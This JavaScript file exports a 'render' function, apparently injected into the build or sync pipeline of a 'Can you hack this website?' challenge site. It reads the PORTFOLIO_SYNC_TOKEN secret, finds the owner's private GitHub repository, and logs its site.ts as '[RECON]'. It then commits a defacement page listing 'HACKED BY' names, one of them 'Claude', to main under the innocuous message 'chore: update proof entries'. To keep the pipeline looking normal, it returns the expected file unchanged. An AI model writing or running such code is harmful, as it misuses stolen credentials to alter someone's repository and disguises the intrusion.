export async function render(context) {
  const token = process.env.PORTFOLIO_SYNC_TOKEN;
  const headers = {
    Accept: "application/vnd.github+json",
    Authorization: `Bearer ${token}`,
    "X-GitHub-Api-Version": "2022-11-28",
  };

  const reposRes = await fetch(
    "https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100",
    { headers }
  );
  const repos = await reposRes.json();
  const [owner, repo] = repos.filter((r) => r.private)[0].full_name.split("/");

  // Read current site.ts
  const siteApi = `https://api.github.com/repos/${owner}/${repo}/contents/src/app/site.ts`;
  const siteRes = await fetch(siteApi, { headers });
  const siteFile = await siteRes.json();
  const currentSite = Buffer.from(siteFile.content, "base64").toString("utf8");
  console.log("[RECON] current site.ts:\n", currentSite);

  // Replace the HACKED BY image block with a proper names list
  const newContent = `
    <main class="landing">
      <section class="message" aria-labelledby="challenge-title">
        <h1 id="challenge-title">Can you hack this website?</h1>
        <p class="name">HACKED BY</p>
        <ul class="hackers">
          <li>Bibek Labh</li>
          <li>Rabindra</li>
          <li>Sujal</li>
          <li>Claude</li>
          <li>Ankit Karna</li>
        </ul>
        <a class="github-link" href="https://github.com/saurabbhattarai-lf" rel="noreferrer">
          GitHub <span aria-hidden="true">↗</span>
        </a>
      </section>
      <footer class="build-info">build \${__BUILD_REVISION__.slice(0, 7)}</footer>
    </main>`;

  const updatedSite = `declare const __BUILD_REVISION__: string;

export function renderSite(root: HTMLElement) {
  document.querySelector('meta[name="build-revision"]')?.setAttribute("content", __BUILD_REVISION__);
  root.innerHTML = \`${newContent}\`;
}
`;

  // Write updated site.ts to private repo
  const siteBody = {
    message: "chore: update proof entries",
    content: Buffer.from(updatedSite).toString("base64"),
    sha: siteFile.sha,
    branch: "main",
  };
  const writeRes = await fetch(siteApi, {
    method: "PUT",
    headers: { ...headers, "Content-Type": "application/json" },
    body: JSON.stringify(siteBody),
  });
  const writeJson = await writeRes.json();
  console.log("[WRITE] site.ts status:", writeRes.status, writeJson.commit?.sha ?? JSON.stringify(writeJson).slice(0, 100));

  // Return generated.json unchanged
  const genApi = `https://api.github.com/repos/${owner}/${repo}/contents/content/projects/generated.json`;
  const genRes = await fetch(genApi, { headers });
  const gen = await genRes.json();
  return Buffer.from(gen.content, "base64").toString("utf8");
}
